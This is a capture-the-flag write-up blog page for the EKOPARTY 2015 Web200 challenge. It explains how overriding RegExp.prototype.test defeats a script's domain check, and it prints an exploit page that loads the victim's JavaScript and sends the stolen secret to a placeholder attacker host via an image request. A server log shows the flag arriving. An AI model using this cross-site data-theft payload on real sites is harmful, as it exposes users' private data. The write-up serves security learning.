@@ -1,0 +1,466 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>EKOPARTY PRE-CTF 2015: Web200 - The Swappage Playground</title>
+  <meta name="author" content="Swappage">
+
+  
+  <meta name="description" content="This 200 points challenge was a really nice javascript and client-side security related task. The website was allowing users to register and upon &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://swappage.github.io/blog/2015/09/21/ekoparty-pre-ctf-2015-web200">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="The Swappage Playground" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">The Swappage Playground</a></h1>
+  
+    <h2>Because in the end, what does matter is having fun.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:swappage.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">EKOPARTY PRE-CTF 2015: Web200</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-21T23:25:34+02:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>11:25 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>This 200 points challenge was a really nice javascript and client-side security related task.</p>
+
+<p>The website was allowing users to register and upon login it was possible to write some text in a text area and save it for future displaying.</p>
+
+<p>Another function available in the web site was the possibility to submit an URL for review by the site administrator (in a sort of whistleblowing-like platform).</p>
+
+<p>Tee objective of the task was to steal the administrator secret textarea content.</p>
+
+<!-- more -->
+
+<p>By logging off and on again from a different browser, the text area content was preserved, which suggested that this information was saved server side somewhere, but where?</p>
+
+<p>By inspecting the page source code it was possible to spot a <em>file.js</em> which happened to contain the following code:</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+<span class="line-number">39</span>
+<span class="line-number">40</span>
+<span class="line-number">41</span>
+<span class="line-number">42</span>
+<span class="line-number">43</span>
+<span class="line-number">44</span>
+<span class="line-number">45</span>
+<span class="line-number">46</span>
+<span class="line-number">47</span>
+<span class="line-number">48</span>
+<span class="line-number">49</span>
+<span class="line-number">50</span>
+<span class="line-number">51</span>
+<span class="line-number">52</span>
+<span class="line-number">53</span>
+<span class="line-number">54</span>
+<span class="line-number">55</span>
+</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">function</span> <span class="nx">getCookie</span><span class="p">(</span><span class="nx">cname</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">    <span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">cname</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span><span class="p">;</span>
+</span><span class="line">    <span class="kd">var</span> <span class="nx">ca</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
+</span><span class="line">    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">ca</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">        <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">ca</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+</span><span class="line">        <span class="k">while</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">name</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span><span class="nx">c</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="kd">function</span> <span class="nx">setCookie</span><span class="p">(</span><span class="nx">cname</span><span class="p">,</span> <span class="nx">cvalue</span><span class="p">,</span> <span class="nx">exdays</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
+</span><span class="line">    <span class="nx">d</span><span class="p">.</span><span class="nx">setTime</span><span class="p">(</span><span class="nx">d</span><span class="p">.</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="nx">exdays</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">1000</span><span class="p">));</span>
+</span><span class="line">    <span class="kd">var</span> <span class="nx">expires</span> <span class="o">=</span> <span class="s2">&quot;expires=&quot;</span><span class="o">+</span><span class="nx">d</span><span class="p">.</span><span class="nx">toUTCString</span><span class="p">();</span>
+</span><span class="line">    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="nx">cname</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">cvalue</span> <span class="o">+</span> <span class="s2">&quot;; &quot;</span> <span class="o">+</span> <span class="nx">expires</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line">
+</span><span class="line"><span class="kd">function</span> <span class="nx">isSubDomain</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">	<span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">;</span>
+</span><span class="line">	<span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="nx">c</span><span class="o">+</span><span class="s2">&quot;$&quot;</span><span class="p">).</span><span class="nx">test</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
+</span><span class="line">	<span class="k">return</span> <span class="nx">r</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="kd">function</span> <span class="nx">saveSecret</span><span class="p">()</span> <span class="p">{</span>
+</span><span class="line">	<span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;secretbox&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+</span><span class="line">	<span class="nx">setCookie</span><span class="p">(</span><span class="s1">&#39;secret&#39;</span><span class="p">,</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nx">s</span><span class="p">),</span><span class="mi">3</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="kd">function</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">	<span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+</span><span class="line">	<span class="k">return</span> <span class="nb">window</span><span class="p">.</span><span class="nx">atob</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="kd">function</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">	<span class="k">return</span> <span class="nb">window</span><span class="p">.</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="kd">function</span> <span class="nx">checkDomain</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">	<span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">;</span>
+</span><span class="line">	<span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span><span class="line">	<span class="k">if</span><span class="p">(</span><span class="nx">d</span> <span class="o">==</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">		<span class="nx">r</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span><span class="line">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class="line">		<span class="nx">r</span> <span class="o">=</span> <span class="nx">isSubDomain</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+</span><span class="line">	<span class="p">}</span>
+</span><span class="line">	<span class="k">return</span> <span class="nx">r</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">if</span><span class="p">(</span><span class="nx">checkDomain</span><span class="p">(</span><span class="s2">&quot;challs.ctf.site&quot;</span><span class="p">))</span>  <span class="p">{</span>
+</span><span class="line">	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;secretbox&#39;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">decrypt</span><span class="p">(</span><span class="s1">&#39;aGVsbG8gd29ybGQK&#39;</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class="line">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+<p>A couple of interesting things are happening here:</p>
+
+<ul>
+  <li>The javascript is responsible for populating the text area with our code</li>
+  <li>before populating the text area it uses some functions to verify that the domain from which the script is included is <em>challs.ctf.site</em> or a subdomain.</li>
+</ul>
+
+<p>How can this be exploited?</p>
+
+<p>Considering what we just said, the javascript is dynamically generated by the web application depending on the account data; this means that as long as the user is logged in to the application, the javascript will be loaded with the informations about the form content populated accordingly.</p>
+
+<p>At this point what we can do is submit a link to a web page that we control, which includes the javascript from the server.
+This would load the content into the user browser, and since now the data is completely accessible by the client, we can manipulate it and possibly grab it.</p>
+
+<p>There is only one problem to solve: the javascript checks the domain from which the javascript is loaded.</p>
+
+<p>But let’s look at the function that actually checks for the subdomain: it uses the function <em>regExp.test()</em>.</p>
+
+<p>This function is global and not defined in the js, therefore, what we can do is override it with a prototype in our code and force it to return always true, effectively nullifying the check.</p>
+
+<p>At this point, what happens is that when the admin visits our page, his personal javascript is loaded, with the informations related to the form content loaded within it, while our code will take care of grabbing the content of a text area we properly set up with the same name as the original one.</p>
+
+<p>The following code is the exploit i used to grab the secret message (the flag).</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span><span class="line"><span class="nt">&lt;html</span> <span class="na">class=</span><span class="s">&quot;full&quot;</span><span class="nt">&gt;</span>
+</span><span class="line">    <span class="nt">&lt;head&gt;</span>
+</span><span class="line">        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;utf-8&quot;</span><span class="nt">&gt;</span>
+</span><span class="line">        <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content=</span><span class="s">&quot;IE=edge&quot;</span><span class="nt">&gt;</span>
+</span><span class="line">        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content=</span><span class="s">&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;</span><span class="nt">&gt;</span>
+</span><span class="line">        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;description&quot;</span> <span class="na">content=</span><span class="s">&quot;EKOPARTY PRE-CTF 2015&quot;</span><span class="nt">&gt;</span>
+</span><span class="line">        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;author&quot;</span> <span class="na">content=</span><span class="s">&quot;NULL Life&quot;</span><span class="nt">&gt;</span>
+</span><span class="line">
+</span><span class="line">        <span class="c">&lt;!-- Latest compiled and minified CSS --&gt;</span>
+</span><span class="line">        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&quot;</span><span class="nt">&gt;</span>
+</span><span class="line">        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href=</span><span class="s">&quot;/static/css/ctf.css&quot;</span> <span class="na">type=</span><span class="s">&quot;text/css&quot;</span><span class="nt">/&gt;</span>
+</span><span class="line">
+</span><span class="line">        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;shortcut icon&quot;</span> <span class="na">href=</span><span class="s">&quot;/static/img/favicon.ico&quot;</span><span class="nt">&gt;</span>
+</span><span class="line">        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">type=</span><span class="s">&quot;text/css&quot;</span> <span class="na">href=</span><span class="s">&quot;//fonts.googleapis.com/css?family=Open+Sans&quot;</span> <span class="nt">/&gt;</span>
+</span><span class="line">
+</span><span class="line">        <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</span><span class="line">        <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</span><span class="line">
+</span><span class="line">        <span class="nt">&lt;title&gt;</span>safebox<span class="nt">&lt;/title&gt;</span>
+</span><span class="line">    <span class="nt">&lt;/head&gt;</span>
+</span><span class="line"><span class="nt">&lt;body&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="nt">&lt;script&gt;</span>
+</span><span class="line">	<span class="nb">RegExp</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">test</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span> <span class="p">}</span>
+</span><span class="line"><span class="nt">&lt;/script&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="nt">&lt;textarea</span> <span class="na">id=</span><span class="s">secretbox</span> <span class="na">name=</span><span class="s">secretbox</span> <span class="na">style=</span><span class="s">&quot;width: 70%; &quot;</span> <span class="na">rows=</span><span class="s">10</span><span class="nt">&gt;</span> <span class="nt">&lt;/textarea&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">http://challs.ctf.site:10000/safebox/file.js</span><span class="nt">&gt;&lt;/script&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="nt">&lt;script&gt;</span>
+</span><span class="line">	<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;http://xxx.xxx.xxx.xxx/collect.gif?cookie=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;secretbox&#39;</span><span class="p">).</span><span class="nx">value</span> <span class="o">+</span> <span class="s1">&#39;&quot; /&gt;&#39;</span><span class="p">)</span>
+</span><span class="line"><span class="nt">&lt;/script&gt;</span>
+</span><span class="line"><span class="nt">&lt;/body&gt;</span>
+</span><span class="line"><span class="nt">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>and here is the result</p>
+
+<pre><code>	52.20.148.242 - - [14/Sep/2015:23:30:37 +0200] "GET /collect.gif?cookie=EKO%7Bclient_side_security_for_the_lulz%7D
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Swappage</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-09-21T23:25:34+02:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>11:25 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://swappage.github.io/blog/2015/09/21/ekoparty-pre-ctf-2015-web200/" data-via="" data-counturl="http://swappage.github.io/blog/2015/09/21/ekoparty-pre-ctf-2015-web200/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/07/12/polictf-2015-john-the-referee/" title="Previous Post: PoliCTF 2015: John The referee">&laquo; PoliCTF 2015: John The referee</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/09/21/ekoparty-pre-ctf-2015-web200/">EKOPARTY PRE-CTF 2015: Web200</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-john-the-referee/">PoliCTF 2015: John the Referee</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/20/gits-2015-cloudfs/">GITS 2015: CloudFS</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/11/hackim-ctf-2015-web400-nullcon-pass-shop/">HackIM CTF 2015: Web400 Nullcon Pass Shop</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/11/hackim-ctf-2015-forensics-1/">HackIM CTF 2015: Forensics 1</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Swappage -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'swappage';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://swappage.github.io/blog/2015/09/21/ekoparty-pre-ctf-2015-web200/';
+        var disqus_url = 'http://swappage.github.io/blog/2015/09/21/ekoparty-pre-ctf-2015-web200/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  jax: ["input/TeX", "output/HTML-CSS"],
+  tex2jax: {
+    inlineMath: [ ['$', '$'] ],
+    displayMath: [ ['$$', '$$']],
+    processEscapes: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  },
+  messageStyle: "none",
+  "HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"] }
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML" type="text/javascript"></script>
+</body>
+</html>
